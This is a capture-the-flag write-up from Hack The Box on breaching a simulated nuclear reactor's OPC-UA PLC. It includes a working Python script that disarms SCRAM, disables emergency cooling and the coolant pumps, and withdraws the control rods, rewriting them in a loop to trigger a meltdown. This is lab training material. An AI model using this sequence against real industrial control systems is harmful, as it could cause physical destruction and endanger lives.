---
type: challenge
platform: Hack The Box
category: "hardware"
difficulty: "medium"
status: Documents
date_started: 2026-03-24
date_completed: 2026-03-24
tags:
  - htb
  - challenge
  - ics
  - scada
  - opc_ua
  - plc
  - nuclear_reactor
---

# Dressrosa Reactor

## Overview

**Category:** hardware
**Difficulty:** medium
**Platform:** Hack The Box
**Date:** 2026-03-24

> [!note] Challenge Scenario
>
> > The Dressrosa Reactor hums with stability, quietly generating power under tight control. But beneath its calm surface lies an exploitable weakness. Breach the OPC-UA PLC interface, seize control of the system, and trigger a meltdown. Two ports: $RHOST:$RPORT (OPC-UA PLC) and $RHOST:$RPORT (Web HMI SCADA dashboard).
>
> English summary: Given an OPC-UA PLC server and a web-based SCADA HMI dashboard for a nuclear reactor. Goal is to exploit the OPC-UA interface to trigger a reactor meltdown and retrieve the flag.

## Enumeration

> [!warning] Not recorded
> No enumeration / reconnaissance steps were recorded in this writeup.

## Vulnerability

### Architecture

- **Port 31111**: Web HMI (Nuclear Reactor SCADA dashboard with Socket.IO real-time updates)
- **Port 32557**: OPC-UA PLC server requiring Basic256Sha256 SignAndEncrypt security mode

### Web HMI (Port 31111)

The web interface displayed a full nuclear reactor control system with:

- Reactor core metrics (temperature, pressure, power, control rods, fuel rods)
- Cooling system (primary/secondary coolant, pumps)
- Power generation (turbine, generator)
- Safety systems (ECCS, SCRAM, radiation monitoring)
- A `flag` HTML element populated via Socket.IO `reactor_update` events when meltdown conditions are met

### OPC-UA Server (Port 32557)

Connected using `opcua` Python library with self-signed certificate:

```python
from opcua import Client
c = Client('opc.tcp://$RHOST:$RPORT')
c.set_security_string("Basic256Sha256,SignAndEncrypt,cert.pem,key.pem")
c.connect()
```

The server required SecurityMode 3 (SignAndEncrypt) with Basic256Sha256 policy. Generated a self-signed cert with openssl.

Browsed the OPC-UA node tree and found the full reactor data model under namespace 2. Checked AccessLevel attribute on all nodes to identify 5 writable nodes:

| Node ID   | Parameter                      | Default Value | Writable |
| --------- | ------------------------------ | ------------- | -------- |
| ns=2;i=11 | controlRods.insertedPercentage | 50.0          | Yes      |
| ns=2;i=26 | coolantPumps.primaryPump       | True          | Yes      |
| ns=2;i=27 | coolantPumps.secondaryPump     | True/False    | Yes      |
| ns=2;i=38 | emergencyCoreCooling.status    | True          | Yes      |
| ns=2;i=41 | scramSystem.armed              | True          | Yes      |

## Exploitation

### Meltdown Attack Sequence

1. **Disarm SCRAM system** (ns=2;i=41 → False): Prevents automatic emergency shutdown when critical thresholds are exceeded
2. **Disable Emergency Core Cooling** (ns=2;i=38 → False): Removes backup cooling capability
3. **Disable coolant pumps** (ns=2;i=26,27 → False): Stops heat removal from reactor core
4. **Withdraw control rods** (ns=2;i=11 → 0.0): Fully withdraws neutron-absorbing rods, causing uncontrolled nuclear fission

Used persistent writes in a loop (every 2 seconds) to maintain attack state against any safety resets.

### Solve Script

```python
#!/usr/bin/env python3
from opcua import Client, ua
import time
import socketio

c = Client('opc.tcp://$RHOST:$RPORT')
c.set_security_string("Basic256Sha256,SignAndEncrypt,cert.pem,key.pem")
c.connect()

# Get writable nodes
control_rods = c.get_node(ua.NodeId(11, 2))
primary_pump = c.get_node(ua.NodeId(26, 2))
secondary_pump = c.get_node(ua.NodeId(27, 2))
eccs = c.get_node(ua.NodeId(38, 2))
scram = c.get_node(ua.NodeId(41, 2))

# Execute meltdown sequence with persistent writes
for i in range(60):
    scram.set_value(ua.DataValue(ua.Variant(False, ua.VariantType.Boolean)))
    eccs.set_value(ua.DataValue(ua.Variant(False, ua.VariantType.Boolean)))
    primary_pump.set_value(ua.DataValue(ua.Variant(False, ua.VariantType.Boolean)))
    secondary_pump.set_value(ua.DataValue(ua.Variant(False, ua.VariantType.Boolean)))
    control_rods.set_value(ua.DataValue(ua.Variant(0.0, ua.VariantType.Double)))

    core_temp = c.get_node(ua.NodeId(3, 2)).get_value()
    reactor_status = c.get_node(ua.NodeId(51, 2)).get_value()
    print(f"[{i*2}s] Temp={core_temp:.1f}°C Status={reactor_status}")

    if not reactor_status:
        print("MELTDOWN TRIGGERED!")
        break
    time.sleep(2)

c.disconnect()

# Get flag via Socket.IO
sio = socketio.Client()
@sio.on('reactor_update')
def on_update(data):
    flag = data.get('flag', '')
    if flag and flag != 'HTB{}':
        print(f"FLAG: {flag}")
        sio.disconnect()

sio.connect('http://$RHOST:$RPORT_HMI')
sio.emit('get_initial_data')
time.sleep(5)
```

### Result

Core temperature rose from ~307°C to 452°C in ~16 seconds. Reactor status changed to False (meltdown). Flag delivered via Socket.IO.

> [!info] Tools Used
>
> - `python3`
> - `openssl`
> - `opcua`
> - `socketio`

## Flag

`HTB{...}`